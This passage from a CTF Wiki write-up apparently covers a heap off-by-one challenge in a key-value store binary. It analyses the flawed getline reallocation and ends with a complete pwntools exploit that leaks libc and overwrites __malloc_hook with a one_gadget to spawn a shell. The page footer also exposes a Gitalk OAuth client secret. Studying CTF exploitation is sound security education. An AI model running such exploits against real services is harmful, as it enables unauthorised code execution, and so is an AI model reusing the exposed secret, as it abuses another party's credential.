  v7 = __readfsqword(0x28u);

  row = (Node *)malloc(0x38uLL);

  if ( !row )

  {

    puts(&quot;FATAL: Can&#39;t allocate a row&quot;);

    exit(-1);

  }

  puts(&quot;PROMPT: Enter row key:&quot;);

  row-&gt;key = getline((__int64)&quot;PROMPT: Enter row key:&quot;, v0);

  puts(&quot;PROMPT: Enter data size:&quot;);

  gets_checked((char *)&amp;v6, 16LL);

  sz = strtoul((const char *)&amp;v6, 0LL, 0);

  row-&gt;data_size = sz;

  v3 = (char *)malloc(sz);

  row-&gt;data = v3;

  if ( v3 )

  {

    puts(&quot;PROMPT: Enter data:&quot;);

    fread_checked(row-&gt;data, row-&gt;data_size);

    v4 = insert_node(row);

    if ( v4 )

    {

      free(row-&gt;key);

      free(*(void **)(v4 + 16));

      *(_QWORD *)(v4 + 8) = row-&gt;data_size;

      *(_QWORD *)(v4 + 16) = row-&gt;data;

      free(row);

      puts(&quot;INFO: Update successful.&quot;);

    }

    else

    {

      puts(&quot;INFO: Insert successful.&quot;);

    }

    result = __readfsqword(0x28u) ^ v7;

  }

  else

  {

    puts(&quot;ERROR: Can&#39;t store that much data.&quot;);

    free(row-&gt;key);

    free(row);

  }

  return result;

}
</pre></div>

<p>The distribution process is:</p>
<p>Malloc (0x38) (structure)
2. getline (malloc 和 realloc)</p>
<ol>
<li>malloc (size) controllable size</li>
<li>Read the size byte content</li>
</ol>
<p>The more complicated part we can see later will be used, that is, the part about <code>free</code> used in put</p>
<p>For deletion, this function is more complicated and will not be explained in detail. In fact, you only need to know that he is deleted according to the key, and the key is read using <code>getline</code>. If there is no such key, the part of <code>getline</code> will not be deleted. If any, then <code>free</code></p>
<h3 id="exploit-analysis">Exploit Analysis<a class="headerlink" href="#exploit-analysis" title="Permanent link">&para;</a></h3>
<p>The location of the vulnerability has been pointed out in the functional analysis, in <code>getline</code>, but the special feature of this function is that its allocated size is gradually increasing, by increasing the available size by two, using <code>realloc</code>, that is, if we want to trigger this vulnerability, we need to meet certain size requirements.</p>
<p>According to the allocation process, the size of the satisfaction is:</p>
<ul>
<li>
<p>0x18</p>
</li>
<li>
<p>0x38</p>
</li>
<li>
<p>0x78</p>
</li>
<li>
<p>0xf8</p>
</li>
<li>
<p>0x1f8</p>
</li>
<li>
<p>...</p>
</li>
</ul>
<p>These sizes can trigger an overflow.</p>
<p>Now we need to know the specific methods we need to adopt. First, the <code>off-by-one</code> vulnerability can cause heap crossover, which can cause the libc address to leak. Afterwards, the utilization method to be used, because there is already a heap crossover, that is, a UAF can be formed, and the UAF common method can be used.</p>
<p>The easiest way to get a UAF vulnerability is of course fastbin attack, so I used fastbin attack.</p>
<p>Here, we can begin to think about how to form the conditions of use we need. The final effect of <code>off-by-one</code> is that you can release a smallbin chunk or unsortedbin chunk of a released state until it is merged into a large chunk by the overflow chunk. That is:</p>
<div class="codehilite"><pre><span></span>+------------+

| | &amp;lt;-- free unsortedbin or smallbin chunk (because fd and bk point to legal pointers at this time, unlink can be done)
+------------+

| ... | &amp;lt;-- arbitrary chunk
+------------+

| | &amp;lt;-- Chunk for overflow
+------------+

| vuln | &amp;lt;-- The chunk that was overflowed, the size is 0x_00 (eg 0x100, 0x200...)
+------------+
</pre></div>

<p>After the use of <code>off-by-one</code>, the chunks that appear above will be merged into a freed chunk. If the position of any intermediate chunk is already allocated, it can cause overlap.</p>
<p>According to our utilization ideas, combined with the topic <code>getline</code> function through <code>malloc(8)</code> and then <code>realloc</code>, we need to:</p>
<ol>
<li>At least one chunk of any chunk location has been allocated, and the chunk of data can be read to leak the libc address.</li>
<li>The chunk that overflows needs to be allocated before the top chunk, otherwise <code>malloc(8)</code> will be allocated to the top instead of where the chunk should be.</li>
<li>Any chunk location needs at least one chunk that has been released and has a size of 0x71 for fastbin attack</li>
<li>All chunks should not be merged into top, so there should be an already allocated chunk at the bottom to guarantee the distance from the top chunk.</li>
<li>The size of the chunk that overflows should belong to unsortedbin or smallbin. It cannot be fastbin. Otherwise, after being released, according to the allocation method of <code>getline</code>, <code>malloc(8)</code> cannot be allocated at this location.</li>
</ol>
<p>According to the above principles, we can think about the distribution of chunks as follows:</p>
<div class="codehilite"><pre><span></span>+------------+

|      1     |  &lt;-- free 的 size == 0x200 chunk

+------------+

| 2 | &amp;lt;-- size == 0x60 fastbin chunk, has been allocated, and can read data
+------------+

| 5 | &amp;lt;-- size == 0x71 fastbin chunk, ready for fastbin attack
+------------+

|      3     |  &lt;-- size == 0x1f8 free 状态的 smallbin/unsortedbin chunk

+------------+

| 4 | &amp;lt;-- size == 0x101 is overflowed chunk
+------------+

| X | &amp;lt;-- arbitrarily allocated chunks prevent top merge
+------------+
</pre></div>

<p>Since the allocation process has some additional structure (the allocation of the structure itself and <code>getline</code>), we need to release enough fastbin chunks to avoid the allocation of the structure itself affecting our process.</p>
<p>After that, release 5, 3, 1, and then use <code>delline</code> when <code>del</code> is input, fill 3, causing <code>off-by-one</code>, then merge 4 <code>free</code> to merge (forgery <code>prev_size</code>), so there is a cross heap structure.</p>
<p>The process is much simpler. First allocate the size of 1 so that the libc address is written to 2, you can leak the address, then allocate 5 and write the required content, you can fastbin attack.</p>
<h3 id="exploit_1">exploit<a class="headerlink" href="#exploit_1" title="Permanent link">&para;</a></h3>
<p>Since the original libc is 2.19 version, loading some strange problems is more troublesome, and this problem does not use the unique features of 2.19, so I used the 2.23 libc for debugging, the version is ubuntu10.</p>
<div class="codehilite"><pre><span></span><span class="ch">#! /usr/bin/env python2</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="c1"># vim:fenc=utf-8</span>

<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">os.path</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
    <span class="n">DEBUG</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">HOST</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">PORT</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">DEBUG</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
        <span class="n">PATH</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">PATH</span><span class="p">)</span>


<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span> <span class="c1"># ubuntu 16.04</span>

<span class="k">def</span> <span class="nf">cmd</span><span class="p">(</span><span class="n">command_num</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;command:&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">command_num</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">put</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;PUT&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;key:&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>

    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;size:&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;data:&#39;</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">:</span>
        <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
    <span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;DEL&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;key:&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">get</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
    <span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;key:&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">)</span>
    <span class="n">num</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39; bytes&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39; bytes&#39;</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="c1"># avoid complicity of structure malloc</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
        <span class="n">put</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="mh">0x38</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
        <span class="n">delete</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>

    <span class="c1"># allocate what we want in order</span>
    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>
    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span>
    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;5&#39;</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s1">&#39;6&#39;</span><span class="p">)</span>
    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">,</span> <span class="mh">0x1f8</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">)</span>
    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="s1">&#39;4&#39;</span><span class="p">)</span>
    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;defense&#39;</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="s1">&#39;defense-data&#39;</span><span class="p">)</span>


    <span class="c1"># free those need to be freed</span>
    <span class="n">delete</span><span class="p">(</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>

    <span class="n">delete</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x1f0</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4e0</span><span class="p">))</span>

    <span class="n">delete</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>

    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;0x200&#39;</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="s1">&#39;fillup&#39;</span><span class="p">)</span>
    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;0x200 fillup&#39;</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="s1">&#39;fillup again&#39;</span><span class="p">)</span>

    <span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc leak: 0x</span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">libc_leak</span><span class="p">)</span>

    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x3c4b78</span>

    <span class="n">p</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc_base: 0x</span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">libc_base</span><span class="p">)</span>

    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;fastatk&#39;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x58</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="mi">5</span> <span class="o">-</span> <span class="mi">8</span><span class="p">))</span>
    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;prepare&#39;</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s1">&#39;prepare data&#39;</span><span class="p">)</span>

    <span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x4526a</span>
    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;attack&#39;</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>

    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;DEL&#39;</span><span class="p">)</span> <span class="c1"># malloc(8) triggers one_gadget</span>

    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></div>
                
                  
                
              
              
                <!-- Set from config but allow override -->
   

<hr>
<blockquote class="page-copyright">
    <p>本页面的全部内容在 <strong>CC BY-NC-SA 4.0</strong> 协议之条款下提供，附加条款亦可能应用。</p>
</blockquote>
<!-- Comments Integration -->
 
<h2 id="__comments">评论</h2>
<form id="gitalk-form" onsubmit="return false;">
    <div id="gitalk-container"></div>
</form>
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
<script src="https://cdnjs.loli.net/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js"></script>
<script>
    const gitalk = new Gitalk({
        clientID: 'd78d2e8d782d95560289',
        clientSecret: '954f1e7f8ae9b2566272a2105fe8df60b50e8e9b',
        repo: 'comment',
        owner: 'ctf-wiki',
        admin: ['40huo', 'iromise'],
        id: md5(location.pathname),      // Ensure uniqueness and length less than 50
        distractionFreeMode: false  // Facebook-like distraction free mode
    })

    gitalk.render('gitalk-container')
</script> 
              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Copyright &copy; 2016 - 2018 CTF Wiki Team
          </div>
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../../assets/javascripts/application.718059d6.js"></script>
      
        
        
          
          <script src="../../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
          
            
              
              
            
          
          
        
      
      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
      
        <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
      
        <script src="../../../../_static/js/extra.js"></script>
      
        <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
      
        <script src="../../../../search/main.js"></script>
      
    
  </body>
</html>